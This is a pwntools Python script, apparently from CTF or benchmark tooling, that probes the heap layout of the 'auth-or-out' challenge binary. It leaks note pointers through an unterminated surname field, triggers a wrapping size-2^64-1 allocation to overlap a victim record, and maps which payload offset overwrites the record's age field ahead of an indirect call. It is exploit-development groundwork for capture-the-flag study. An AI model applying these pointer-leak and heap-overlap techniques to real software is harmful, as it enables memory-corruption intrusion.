"""MEASUREMENT probe for auth-or-out's tinyalloc arena layout.

Not an exploit. It answers three questions with observed numbers, so the
executor can stop guessing them:

  Q1 What address does the recycled (wrapping) allocation land at, and is it
     STABLE across repeated wrapping allocations?
  Q2 Is `note_k == record_k + RECORD_SIZE` (the two back-to-back allocator
     calls in the create body)?
  Q3 What payload offset lands on the victim record's `age` member? (read back
     through the `Age: %llu` print, which happens BEFORE the indirect call)

Run:  PYTHONPATH=. python3 benchmark/soundness_probes/auth_or_out_arena_measure.py
"""
import sys
from pwn import *

context.log_level = 'error'
EXE = '/srv/share/dev/supwngo/tests/htb-targets/organized/auth-or-out'
RECORD_SIZE = 0x38          # RECOVERED from image: mov $0x38,%edi; call ta_alloc
MASK64 = (1 << 64) - 1


def menu(p, c):
    p.recvuntil(b'Choice: '); p.sendline(str(c).encode())


def add(p, nsize, note=None, name=b'AA', sur=b'BB', age=1):
    menu(p, 1)
    p.recvuntil(b'Name: '); p.send(name + b'\n')
    p.recvuntil(b'Surname: '); p.send(sur + b'\n')
    p.recvuntil(b'Age: '); p.sendline(str(age).encode())
    p.recvuntil(b'Author Note size: '); p.sendline(str(nsize).encode())
    if note is not None:
        p.recvuntil(b'Note: '); p.send(note + b'\n')


def mod(p, i, name=b'N' * 15, sur=b'S' * 16, age=7):
    menu(p, 2)
    p.recvuntil(b'Author ID: '); p.sendline(str(i).encode())
    p.recvuntil(b'Name: '); p.send(name + b'\n')
    p.recvuntil(b'Surname: '); p.send(sur + b'\n')
    p.recvuntil(b'Age: '); p.sendline(str(age).encode())


def show(p, i):
    menu(p, 3); p.recvuntil(b'Author ID: '); p.sendline(str(i).encode())
    return p.recvuntil(b'-----------------------', timeout=3)


def dele(p, i):
    menu(p, 4); p.recvuntil(b'Author ID: '); p.sendline(str(i).encode())
    return p.recvuntil(b'\n\n', timeout=3)


def leak_note_ptr(p, i):
    """modify_author reads surname with size 0x11 -> 16 bytes, no NUL, so
    `Surname: %s` runs straight into the note pointer at +0x20."""
    mod(p, i)
    o = show(p, i)
    line = [l for l in o.split(b'\n') if l.startswith(b'Surname: S')]
    if not line:
        return None
    raw = line[0][len(b'Surname: ') + 16:]
    return u64(raw.ljust(8, b'\x00')[:8])


print("=== Q1/Q2: note pointers and recycled-block address ===")
p = process(EXE)
for _ in range(3):
    add(p, 16, b'n')
n1 = leak_note_ptr(p, 1)
n2 = leak_note_ptr(p, 2)
n3 = leak_note_ptr(p, 3)
print("[measured] note1=%#x note2=%#x note3=%#x" % (n1, n2, n3))
print("[measured] note2-note1=%#x note3-note2=%#x" % (n2 - n1, n3 - n2))
print("[inferred] record2 = note2 - RECORD_SIZE = %#x" % (n2 - RECORD_SIZE))
print("[inferred] record3 = note3 - RECORD_SIZE = %#x" % (n3 - RECORD_SIZE))

dele(p, 1)
# short wrapping allocation: 8 filler bytes cannot reach any member
add(p, MASK64, b'Z' * 8)
r1 = leak_note_ptr(p, 1)          # new record took slot 0 -> ID 1
print("[measured] recycled block #1 = %#x" % r1)
print("[measured] recycled - note1  = %#x" % (r1 - n1))
print("[measured] record2 - recycled = %#x  <-- PREFIX" % ((n2 - RECORD_SIZE) - r1))

# is the recycled address STABLE for a second wrapping allocation?
add(p, MASK64, b'Y' * 8)
r2 = leak_note_ptr(p, 4)
print("[measured] recycled block #2 = %#x  (stable=%s)" % (r2, r2 == r1))
add(p, MASK64, b'X' * 8)
r3 = leak_note_ptr(p, 5)
print("[measured] recycled block #3 = %#x  (stable=%s)" % (r3, r3 == r1))
p.close()

print()
print("=== Q3: which payload offset lands on record2.age ===")
p = process(EXE)
for _ in range(3):
    add(p, 16, b'n')
n2b = leak_note_ptr(p, 2)
dele(p, 1)
# 8-byte markers; skip k==10 so no 0x0a byte terminates the read early
blob = b''.join(p64(0xAA00 + k) for k in range(24) if k != 10)
add(p, MASK64, blob)
o = show(p, 2)
age = [l for l in o.split(b'\n') if l.startswith(b'Age: ')]
print("[measured] Age line: %r" % (age[0] if age else None))
if age:
    v = int(age[0][len(b'Age: '):])
    ks = [k for k in range(24) if k != 10]
    if 0xAA00 <= v <= 0xAA20:
        k = v - 0xAA00
        slot = ks.index(k)
        print("[measured] record2.age is fed by marker k=%d -> payload offset %#x"
              % (k, slot * 8))
        print("[measured] => PREFIX = %#x - 0x28 = %#x" % (slot * 8, slot * 8 - 0x28))
p.close()
